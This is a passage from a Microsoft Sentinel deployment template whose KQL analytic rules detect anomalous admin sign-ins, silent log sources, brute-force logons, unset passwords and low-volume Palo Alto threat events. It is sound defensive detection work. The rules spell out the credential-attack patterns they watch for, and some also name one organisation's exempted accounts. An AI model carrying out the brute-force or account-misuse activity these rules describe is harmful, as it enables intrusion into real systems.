          "query": "let admin_users = (IdentityInfo\n  | summarize arg_max(TimeGenerated, *) by AccountUPN\n  | where AssignedRoles contains \"admin\"\n  | summarize by tolower(AccountUPN));\n  let admin_asn = (SigninLogs\n  | where TimeGenerated between (ago(7d)..ago(1d))\n  | where tolower(UserPrincipalName) in (admin_users)\n  | summarize by AutonomousSystemNumber);\n  let admin_locations = (SigninLogs\n  | where TimeGenerated between (ago(7d)..ago(1d))\n  | where tolower(UserPrincipalName) in (admin_users)\n  | summarize by Location);\n  let admin_devices = (SigninLogs\n  | where TimeGenerated between (ago(7d)..ago(1d))\n  | where tolower(UserPrincipalName) in (admin_users)\n  | extend deviceId = tostring(DeviceDetail.deviceId)\n  | where isnotempty(deviceId)\n  | summarize by deviceId);\n  SigninLogs\n  | where TimeGenerated > ago(1d)\n  | where ResultType == 0\n  | where tolower(UserPrincipalName) in (admin_users)\n  | extend deviceId = tostring(DeviceDetail.deviceId)\n  | where AutonomousSystemNumber !in (admin_asn) and deviceId !in (admin_devices) and Location !in (admin_locations)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "af435ca1-fb70-4de1-92c1-7435c48482a9",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9050')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9050')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9050: [Health] CommonSecurityLog - Silent - A computer has not been seen",
          "description": "This rule alerts when computers that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in the last two days (configurable).\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9050_CONFIGURATION MITRE:  Category: Health tag: Health",
          "severity": "Medium",
          "enabled": true,
          "query": "let suppression_time=3d; \nlet start_time_historical = 14d;\nlet alert_bin = 1d;\nlet max_reportable_days = 7;\nlet Threshold = 2;\nlet description = (table_parameter: (*)){ \n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff((k startswith 'bv_' or k startswith 'sourcetype') and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")  \n  };\n//Make a list of all previously seen computers\nlet RecentAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(suppression_time) .. now())\n| where AlertName startswith 'BV-9050'\n| extend Computer = todynamic(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).Computer))[0]))\n| summarize make_set_if(Computer, isnotempty(Computer))\n);\nCommonSecurityLog\n| extend Computer = iif(Computer =='' or (DeviceProduct == 'LF' and Computer startswith 'logfwd'), DeviceName, Computer)\n| where Computer matches regex A9050_EXCLUDED_COMPUTER == false\n| where DeviceVendor matches regex A9050_EXCLUDED_DEVICEVENDOR == false\n| where DeviceProduct matches regex A9050_EXCLUDED_DEVICEVENDOR == false\n| make-series EventCount=count() on TimeGenerated from ago(start_time_historical) to now() step alert_bin by Computer, DeviceVendor\n| extend (anomalies, score, baseline) = series_decompose_anomalies(EventCount)\n| mv-apply e=EventCount on (\n  summarize TotalDaysMissing=countif(e==0)\n)\n| where TotalDaysMissing < 4\n|extend TotalEventCount=array_sum(EventCount)\n|where TotalEventCount > 10000\n//Start Calculate days missing\n| extend EventCountString = strcat_array(EventCount, ',')\n| extend DaysMissingString = extract(@'[1-9]*,([,0]+)$',1,EventCountString)\n| extend DaysMissingString = replace_string(DaysMissingString, ',', '')\n| extend DaysMissing = string_size(DaysMissingString)\n//End Calculate Days Missing\n| project Computer, Threshold, EventCount, anomalies, score, baseline, DaysMissing, DeviceVendor\n| extend Threshold_TimeToMonitor = iff(isnotempty(A9050_CONFIGURATION[Computer]), A9050_CONFIGURATION[Computer], Threshold)\n| where DaysMissing != 0\n//Max Numbers of days that a device will report\n| where DaysMissing between( Threshold_TimeToMonitor .. max_reportable_days)\n//Suppression for previously reported devices\n| where Computer !in (RecentAlerts)\n| summarize Src=make_set(Computer), Data=make_set(pack(\"Computer\", Computer, 'EventCount', EventCount, 'Threshold', Threshold_TimeToMonitor)), EventCount=count() by Threshold_TimeToMonitor, DeviceVendor, DaysMissing\n| extend ExtendedDescription = strcat(\n          'Device Product: ', DeviceVendor\n          ,'\\nMissing Computers: ', EventCount\n          ,'\\nMissing Computers (limited to 20): \\n* ', strcat_array(array_slice(Src,0,20), '\\n* '))\n| extend AlertName = iff(array_length(Src) == 1, strcat(DeviceVendor, ' - ', Src[0], ' has been missing for ', Threshold_TimeToMonitor, ' days'), strcat(DeviceVendor, ' - ', EventCount, ' computers have been missing for ', Threshold, ' days'))\n|extend  sourcetype = 'CommonSecurityLog'\n    , bv_mss_category = 'LogSource Disruption'\n    , bv_alarm_type = 'Silent Device'\n    , bv_alarm_sub_type = 'EFD v1.0'\n    , bv_alarm_threshold = tostring(Threshold_TimeToMonitor)\n    , bv_alarm_value = strcat(DaysMissing,'d')\n    , bv_alarm_name = 'BV-9050'\n    , bv_src_dvc = tostring(Src)\n    , bv_vendor_product = DeviceVendor\n    , bv_event_count = toint(EventCount)\n    , bv_severity = 'medium'\n| invoke description()\n| extend bv_rule_version = '1.0.43076'\n| extend bv_rule_timestamp = '1688673694.593636'\n| project-keep Src\n    , Data\n    , ExtendedDescription\n    , AlertName\n    , DeviceVendor\n    , sourcetype\n    , bv_*",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9050: [Health] CommonSecurityLog - {{AlertName}}",
            "alertDescriptionFormat": "This rule alerts when computers that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in the last two days (configurable).\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9050_CONFIGURATION\n\n{{ExtendedDescription}}\n\nCategory: CommonSecurityLog\ntag: Health\nbv_rule_version: {{bv_rule_version}}\nbv_rule_timestamp: {{bv_rule_timestamp}}"
          },
          "customDetails": {
            "Computer": "Src"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9385')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9385')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9385: [Health] - Silent - AirSupport XDR Incident Connector Offline",
          "description": "This alert identifies a previously reporting Microsoft XDR connector that has not generated the SecurityIncident datatype within the expected threshold. This datatype is required for AirSupport to function. MITRE:  Category: Health tag: Health",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 0h;  \nlet start_time = 13d;\nlet end_time = now(); \nlet suppression_time=60h; \nlet bv_alert_missing_threshold = toreal(8);\nlet Hist_ProductList = SecurityAlert\n  | where TimeGenerated between (startofday(ago(start_time)) .. ago(8h))\n  | where ProductName in~ (\"Office 365 Advanced Threat Protection\", \"Azure Active Directory Identity Protection\", \"Microsoft Defender Advanced Threat Protection\", \"Microsoft Cloud App Security\", \"Azure Advanced Threat Protection\", \"Microsoft Data Loss Prevention\", \"Microsoft 365 Defender\", \"Azure Security Center\", \"Microsoft Defender for Cloud\", \"MDC Agentless Antimalware\")\n  | summarize EventCountPerProduct=count(), FirstEventTime = min(TimeGenerated), LastEventTime = max(TimeGenerated) by ProductName, ProviderName, Type;\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(suppression_time) .. now())\n  | where AlertName startswith 'BV-9385:'\n  |parse DisplayName with * ' Offline ' connector_name\n  |summarize make_set_if(connector_name, isnotempty(connector_name)), eventcount=count()\n  );\nlet AlertResult=SecurityAlert\n  | where TimeGenerated > ago(8h) and TimeGenerated < end_time\n  | where ProductName in~ (\"Office 365 Advanced Threat Protection\", \"Azure Active Directory Identity Protection\", \"Microsoft Defender Advanced Threat Protection\", \"Microsoft Cloud App Security\", \"Azure Advanced Threat Protection\", \"Microsoft Data Loss Prevention\", \"Microsoft 365 Defender\", \"Azure Security Center\", \"Microsoft Defender for Cloud\", \"MDC Agentless Antimalware\")\n  | join kind=rightanti Hist_ProductList on ProductName\n|summarize total_event_count=take_any(EventCountPerProduct), alert_earliest_time=take_any(FirstEventTime), alert_latest_time=take_any(LastEventTime) by ProductName, ProviderName, Type\n|extend alert_provider_list = pack_array(strcat(ProviderName, ' - ', ProductName))\n|extend alert_provider_list = tostring(array_sort_asc(alert_provider_list)) \n      , hours_since_last_alert = round((now() - alert_latest_time)/1h, 4)\n|extend days_since_last_alert = round(hours_since_last_alert/24, 2)\n      , jk = 1             \n;\nlet IncidentResult = materialize(\nSecurityIncident\n| where TimeGenerated > startofday(ago(start_time)) and TimeGenerated < end_time\n| summarize arg_max(TimeGenerated, *) by IncidentNumber\n| where ProviderName == \"Microsoft 365 Defender\" or ProviderName == \"Microsoft XDR\"\n| where ProviderName !in (RecentAlerts)\n|project-keep TimeGenerated, IncidentNumber, ProviderName, Type\n|summarize total_event_count=count() , incident_earliest_time=min(TimeGenerated), incident_latest_time=max(TimeGenerated) by ProviderName, Type);\nlet CurrentlyReporting = toscalar(IncidentResult\n| where incident_latest_time >= ago(22h)\n| summarize make_set(ProviderName));\nIncidentResult\n| where array_length(CurrentlyReporting) == 0 or isempty(CurrentlyReporting[0])\n|extend incident_provider_list = pack_array(ProviderName)\n|extend incident_provider_list = tostring(array_sort_asc(incident_provider_list)), jk = 1     \n|extend total_days_in_range= (now() - (startofday(ago(13d))))/1d\n|extend average_per_day=round((total_event_count/total_days_in_range), 2)\n|extend hours_since_last_incident = round((now() - incident_latest_time)/1h, 4)\n|extend bv_alarm_threshold= case(\n                (average_per_day >= 0 and average_per_day < 10) , 168\n        ,(average_per_day >= 10 and average_per_day < 500) , 24\n        ,(average_per_day >= 500 and average_per_day < 1000) , 18\n        ,(average_per_day >= 1000 ) , 8  \n                ,total_event_count == 1, 168\n                ,168 \n                )\n|extend days_since_last_incident = round(hours_since_last_incident/24, 2)\n| join kind=leftouter AlertResult on jk \n| extend ProductName = coalesce(ProductName, ProviderName) \n|extend bv_alarm_threshold = toreal(bv_alarm_threshold)\n|where hours_since_last_incident > bv_alarm_threshold\n|extend bv_src_dvc = tostring(incident_provider_list)\n    ,bv_reporting_dvc = tostring(incident_provider_list)\n| extend Tags = 'tag: Health' \n| extend msg_ = case(hours_since_last_alert > bv_alarm_threshold == false, strcat('\\n\\nDefender is still showing alerts normally in the ', Type1, ' table. This indicates that those Defender alerts are potentially not making it to the SecurityIncident Table thus disrupting BlueVoyant Automation activity.')\n    , hours_since_last_alert > bv_alert_missing_threshold, strcat('\\n\\nAlso, ', alert_provider_list, ' has gone ', hours_since_last_alert,' hours / ', days_since_last_alert ,' days without sending an alert to the ', Type1, ' table.\\n', 'The threshold for this not sending alerts is ', bv_alert_missing_threshold, ' hours for the environment.'), '')\n            |extend ExtendedDescription = strcat('The Microsoft XDR connector ', bv_src_dvc, ' has gone ', hours_since_last_incident,' hours / ', days_since_last_incident ,' days without sending an incident to the ', Type, ' table\\n', 'The threshold for this connector not sending incidents is ', bv_alarm_threshold, ' hours for this environment. '\n    , msg_\n    , '\\n\\nPlease ensure that the XDR connector is enabled, configured properly, and online.')\n  |extend bv_start_time = now()\n    //, bv_end_time = \n    , bv_mss_category = 'LogSource Disruption'\n    , bv_alarm_type = 'Silent Provider'\n    , bv_alarm_sub_type = 'EFD v1.0'\n    , bv_alarm_name = 'BV-9385'\n    , sourcetype = 'MS XDR Connector'\n    , bv_alarm_value = strcat(hours_since_last_incident, ' hours')\n    , bv_severity = 'high'\n|extend bv_src_dvc = todynamic(bv_src_dvc)\n|extend bv_src_dvc=bv_src_dvc.[0]\n|project-keep  ExtendedDescription, Tags, sourcetype\n  , bv_*, days_since_last_* \n  , incident_provider_list",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9385: [Health] - Silent - AirSupport XDR Incident Connector Offline {{bv_src_dvc}}",
            "alertDescriptionFormat": "This alert identifies a previously reporting Microsoft XDR connector that has not generated the SecurityIncident datatype within the expected threshold. This datatype is required for AirSupport to function.  \n{{ExtendedDescription}} \nCategory: Sentinel Usage \n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f7a4097d-8709-403b-b850-17a9afaf42fa')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f7a4097d-8709-403b-b850-17a9afaf42fa')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AD user enabled and password not set within 48 hours",
          "description": "Identifies when an account is enabled with a default password and the password is not set by the user within 48 hours.\nEffectively, there is an event 4722 indicating an account was enabled and within 48 hours, no event 4723 occurs which\nindicates there was no attempt by the user to set the password. This will show any attempts (success or fail) that occur\nafter 48 hours, which can indicate too long of a time period in setting the password to something that only the user knows.\nIt is recommended that this time period is adjusted per your internal company policy.",
          "severity": "Low",
          "enabled": false,
          "query": "let starttime = 3d;\nlet SecEvents = materialize ( SecurityEvent | where TimeGenerated >= ago(starttime)\n| where EventID in (4722,4723) | where TargetUserName !endswith \"$\"\n| project TimeGenerated, EventID, Activity, Computer, TargetAccount, TargetSid, SubjectAccount, SubjectUserSid);\nlet userEnable = SecEvents\n| extend EventID4722Time = TimeGenerated\n// 4722: User Account Enabled\n| where EventID == 4722\n| project Time_Event4722 = TimeGenerated, TargetAccount, TargetSid, SubjectAccount_Event4722 = SubjectAccount, SubjectUserSid_Event4722 = SubjectUserSid, Activity_4722 = Activity, Computer_4722 = Computer;\nlet userPwdSet = SecEvents\n// 4723: Attempt made by user to set password\n| where EventID == 4723\n| project Time_Event4723 = TimeGenerated, TargetAccount, TargetSid, SubjectAccount_Event4723 = SubjectAccount, SubjectUserSid_Event4723 = SubjectUserSid, Activity_4723 = Activity, Computer_4723 = Computer;\nuserEnable | join kind=leftouter userPwdSet on TargetAccount, TargetSid\n| extend PasswordSetAttemptDelta_Min = datetime_diff('minute', Time_Event4723, Time_Event4722)\n| where PasswordSetAttemptDelta_Min > 2880 or isempty(PasswordSetAttemptDelta_Min)\n| project-away TargetAccount1, TargetSid1\n| extend Reason = @\"User either has not yet attempted to set the initial password after account was enabled or it occurred after 48 hours\"\n| order by Time_Event4722 asc\n| project-reorder Time_Event4722, Time_Event4723, PasswordSetAttemptDelta_Min, TargetAccount, TargetSid\n| extend Computer = coalesce(Computer_4723, Computer_4722)\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n| extend AccountName = tostring(split(TargetAccount, \"\\\\\")[1]), AccountNTDomain = tostring(split(TargetAccount, \"\\\\\")[0])\n| project-away DomainIndex\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "62085097-d113-459f-9ea7-30216f2ee6af",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetAccount"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Sid",
                  "columnName": "TargetSid"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a9aebeeb-6a7a-41e8-9789-e3c3a8417172')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a9aebeeb-6a7a-41e8-9789-e3c3a8417172')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SecurityEvent - Multiple authentication failures followed by a success",
          "description": "Identifies accounts who have failed to logon to the domain multiple times in a row, followed by a successful authentication within a short time frame. Multiple failed attempts followed by a success can be an indication of a brute force attempt or possible mis-configuration of a service account within an environment.\nThe lookback is set to 2h and the authentication window and threshold are set to 1h and 5, meaning we need to see a minimum of 5 failures followed by a success for an account within 1 hour to surface an alert.",
          "severity": "Low",
          "enabled": true,
          "query": "let timeRange = 2h;\nlet authenticationWindow = 1h;\nlet authenticationThreshold = 5;\nSecurityEvent\n| where Account != \"EXPROD\\\\LSKCNSPRD1$\" and Account != \"EXPROD\\\\LSKCNSPRD2$\"//EXPROD accounts for Kofax local scan - Expected Behaviour\n| where TimeGenerated > ago(timeRange)\n| where EventID in (4624, 4625)\n| where IpAddress != \"-\" and isnotempty(Account)\n| extend Outcome = iff(EventID == 4624, \"Success\", \"Failure\")\n// bin outcomes into 10 minute windows to reduce the volume of data\n| summarize OutcomeCount=count() by bin(TimeGenerated, 10m), Account, IpAddress, Computer, Outcome\n| project TimeGenerated, Account, IpAddress, Computer, Outcome, OutcomeCount\n// sort ready for sessionizing - by account and time of the authentication outcome\n| sort by TimeGenerated asc, Account, IpAddress, Computer, Outcome, OutcomeCount\n| serialize\n// sessionize into failure groupings until either the account changes or there is a success\n| extend SessionStartedUtc = row_window_session(TimeGenerated, timeRange, authenticationWindow, Account != prev(Account) or prev(Outcome) == \"Success\")\n// count the failures in each session\n| summarize FailureCountBeforeSuccess=sumif(OutcomeCount, Outcome == \"Failure\"), StartTime=min(TimeGenerated), EndTime=max(TimeGenerated), make_list(Outcome, 128), make_set(Computer, 128), make_set(IpAddress, 128) by SessionStartedUtc, Account\n// the session must not start with a success, and must end with one\n| where array_index_of(list_Outcome, \"Success\") != 0\n| where array_index_of(list_Outcome, \"Success\") == array_length(list_Outcome) - 1\n| project-away SessionStartedUtc, list_Outcome\n// where the number of failures before the success is above the threshold\n| where FailureCountBeforeSuccess >= authenticationThreshold\n// expand out ip and computer for customer entity assignment\n| mv-expand set_IpAddress, set_Computer\n| extend IpAddress = tostring(set_IpAddress), Computer = tostring(set_Computer)\n| extend timestamp=StartTime, NTDomain = split(Account, '\\\\', 0)[0], Name = split(Account, '\\\\', 1)[0], HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))\n",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "cf3ede88-a429-493b-9108-3e46d3c741f7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Account"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "NTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/22c1fa33-fb9a-4380-b6bd-e30e47f999a2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/22c1fa33-fb9a-4380-b6bd-e30e47f999a2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] Palo Alto Threat signatures from Unusual IP addresses with Threat Intelligence Correlation",
          "description": "This rule detects low-volume threat events originating from Palo Alto Networks firewalls, which may indicate stealthy, emerging, or under-the-radar attacks. \n\nIt identifies IPs involved in recent threat alerts that:\n--- Have not been historically noisy (based on the past 6\u00e2\u20ac\u201c7 days)\n--- Are producing a low number of alerts in the last hour\n\nThe Output is enriched with Threat Intelligence Field indicating a True or False statement.\n--- TI_Match_Status (True/False)",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 7d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet HistThreshold = 25;\nlet CurrThreshold = 10;\n// Step 1: Get TI indicators\nlet IP_Indicators = ThreatIntelligenceIndicator\n    | where isnotempty(NetworkIP) or isnotempty(NetworkSourceIP) or isnotempty(NetworkDestinationIP)\n    | extend TI_ipEntity = coalesce(NetworkIP, NetworkSourceIP, NetworkDestinationIP)\n    | where ipv4_is_private(TI_ipEntity) == false\n    | where TimeGenerated >= ago(7d) and Active == true\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by TI_ipEntity;\n// Step 2: Historical Threats (ok to use make_set here)\nlet HistoricalThreats = CommonSecurityLog\n    | where isnotempty(SourceIP)\n    | where TimeGenerated between (startofday(ago(starttime)) .. startofday(ago(endtime)))\n    | where DeviceVendor =~ \"Palo Alto Networks\"\n    | where Activity =~ \"THREAT\" and SimplifiedDeviceAction =~ \"alert\"\n    | where DeviceEventClassID in ('spyware', 'scan', 'file', 'vulnerability', 'flood', 'packet', 'virus', 'wildfire', 'wildfire-virus')\n    | summarize\n        TotalEvents = count(),\n        ThreatTypes = make_set(DeviceEventClassID),\n        DestinationIpList = make_set(DestinationIP),\n        FirstSeen = min(TimeGenerated),\n        LastSeen = max(TimeGenerated)\n        by SourceIP, DeviceAction, DeviceVendor;\n// Step 3: Current Threats with TI correlation \u00e2\u20ac\u201d join BEFORE aggregation\nlet CurrentThreatsWithTI = CommonSecurityLog\n    | where isnotempty(SourceIP)\n    | where TimeGenerated > ago(timeframe)\n    | where DeviceVendor =~ \"Palo Alto Networks\"\n    | where Activity =~ \"THREAT\" and SimplifiedDeviceAction =~ \"alert\"\n    | where DeviceEventClassID in ('spyware', 'scan', 'file', 'vulnerability', 'flood', 'packet', 'virus', 'wildfire', 'wildfire-virus')\n    | extend DestinationIP = tostring(DestinationIP)\n    | join kind=leftouter (\n        IP_Indicators\n        | extend TI_ipEntity = tostring(TI_ipEntity)\n    ) on $left.DestinationIP == $right.TI_ipEntity\n    | extend TI_Match = iff(isnotempty(TI_ipEntity), \"True\", \"False\");\n// Step 4: Aggregate and flag TI\nlet CurrentHourThreats = CurrentThreatsWithTI\n    | summarize\n        TotalEvents = count(),\n        ThreatTypes = make_set(DeviceEventClassID),\n        DestinationIPs = make_set(DestinationIP),\n        TI_Matched_IPs = make_set(TI_ipEntity),\n        TI_Match_Status = iff(countif(isnotempty(TI_ipEntity)) > 0, \"True\", \"False\"),\n        FirstSeen = min(TimeGenerated),\n        LastSeen = max(TimeGenerated)\n        by SourceIP, DeviceAction, DeviceProduct, DeviceVendor;\n// Step 5: Filter final alerting conditions\nCurrentHourThreats\n| where TotalEvents < CurrThreshold\n| join kind=leftanti (\n    HistoricalThreats\n    | where TotalEvents > HistThreshold\n) on SourceIP\n\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery",
            "CommandAndControl",
            "Exfiltration"
          ],
          "techniques": [
            "T1046",
            "T1071",
            "T1030"
          ],
          "subTechniques": [
            "T1071.001"
          ],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/20d67926-d334-4a6b-be5c-43c668dfd9a9')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/20d67926-d334-4a6b-be5c-43c668dfd9a9')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] Replay Attack Detection Following Credential Use (Non-Machine Account)",
